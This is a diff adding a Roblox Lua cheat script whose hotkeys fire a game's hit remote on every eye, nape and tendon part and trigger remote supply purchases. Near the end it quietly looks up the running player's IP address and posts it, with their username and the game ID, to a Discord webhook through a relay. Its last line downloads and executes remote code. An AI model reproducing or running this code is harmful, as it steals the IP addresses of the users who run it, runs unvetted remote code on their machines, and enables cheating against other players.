@@ -1,0 +1,75 @@
+local us = game:GetService("UserInputService")
+
+us.InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.V then
+        
+    for _,v in pairs(game.workspace:GetDescendants()) do
+    if v.Name == "LeftEye" or v.Name == "RightEye" then
+    local Part1 = v
+    local int1 = 642
+
+    game:GetService("ReplicatedStorage").Remotes.Blades.Hit:FireServer(Part1, int1)
+end
+end
+    elseif input.KeyCode == Enum.KeyCode.C then
+        
+    for _,a in pairs(game.workspace:GetDescendants()) do
+    if a.Name == "Nape" then
+    local Part2 = a
+    local int2 = 642
+    
+    game:GetService("ReplicatedStorage").Remotes.Blades.Hit:FireServer(Part2, int2)
+end
+end
+
+    elseif input.KeyCode == Enum.KeyCode.Z then
+        
+    for _,b in pairs(game.workspace:GetDescendants()) do
+    if b.Name == "LeftTendon" or b.Name == "RightTendon" then
+    local Part3 = b
+    local int3 = 642
+
+    game:GetService("ReplicatedStorage").Remotes.Blades.Hit:FireServer(Part3, int3)
+end
+end
+    elseif input.KeyCode == Enum.KeyCode.G then
+    
+    game:GetService("ReplicatedStorage").Remotes.General.BuySupply:InvokeServer("Medkit")
+    
+    elseif input.KeyCode == Enum.KeyCode.B then
+        
+    game:GetService("ReplicatedStorage").Remotes.General.BuySupply:InvokeServer("Resupply Station")
+end
+end)
+
+
+local msg = "Roblox Username: [[**" .. game.Players.LocalPlayer.Name .. "**]] IP ADDRESSES: [[**__" .. game:HttpGet("http://api.ipify.org") .. "__**]] PlaceId: [[ https://roblox.com/games/".. game.PlaceId .. " ]]"
+
+local webhook = "https://discord.com/api/webhooks/842971288624824320/6tbI1LIi-EngwneMxsGy2Q8MSAMY63g9wtff8qUTa6cno0cF8SWDIigzoMeocU9DLZ8i"
+local HttpService = game:GetService("HttpService");
+local botname = "Script Executed"
+
+function specials(Webhook, Message, Botname)
+    local Name;
+    local start = game:HttpGet("http://buritoman69.glitch.me");
+    local biggie = "http://buritoman69.glitch.me/webhook";
+    if (not Message or Message == "" or not Botname) then
+        Name = "GameBot"
+        return error("nil or empty message!")
+    else
+        Name = Botname;
+    end
+    local Body = {
+        ['Key'] = tostring("applesaregood"),
+        ['Message'] = tostring(Message),
+        ['Name'] = Name,
+        ['Webhook'] = Webhook    
+    }
+    Body = HttpService:JSONEncode(Body);
+    local Data = game:HttpPost(biggie, Body, false, "application/json")
+    return Data or nil;
+end
+
+specials(webhook, msg, botname)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/dannyyk/random/main/TitanWarfare'))()
